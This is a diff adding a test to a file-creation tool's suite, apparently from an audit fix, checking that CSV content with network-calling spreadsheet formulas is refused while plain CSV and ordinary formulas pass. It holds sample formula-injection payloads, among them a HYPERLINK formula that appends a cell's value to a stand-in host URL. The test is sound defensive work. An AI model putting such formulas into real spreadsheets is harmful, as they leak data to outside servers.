@@ -80,6 +80,17 @@ describe("create_file", () => {
 		expect(ok.ok).toBe(true);
 	});
 
+	it("csv com fórmula de rede em algum campo também falha; csv comum e fórmula comum seguem (reauditoria F2, N1)", async () => {
+		const { fake, tool, ctx } = setup();
+		for (const content of ['nome,link\nAna,=HYPERLINK("http://x/?"&A2,"ok")', 'a;"@WEBSERVICE(""http://x"")"', "x\t+IMPORTXML(\"http://x\",\"//a\")"]) {
+			const out = await tool("create_file").run({ filename: "p.csv", content }, ctx);
+			expect(out).toMatchObject({ ok: false, error: expect.stringContaining("not accepted") });
+		}
+		expect(fake.created).toHaveLength(0);
+		const ok = await tool("create_file").run({ filename: "p.csv", content: "item,valor\ncafé,-3\ntotal,=SUM(B2:B2)" }, ctx);
+		expect(ok.ok).toBe(true);
+	});
+
 	it("xlsx recebe sheets e pptx recebe slides", async () => {
 		const { fake, tool, ctx } = setup();
 		const sheet = await tool("create_file").run({ filename: "preços.xlsx", sheets: [{ name: "Preços", columns: ["item", "valor"], rows: [["a", 1], ["b", "=B2*2"]] }] }, ctx);
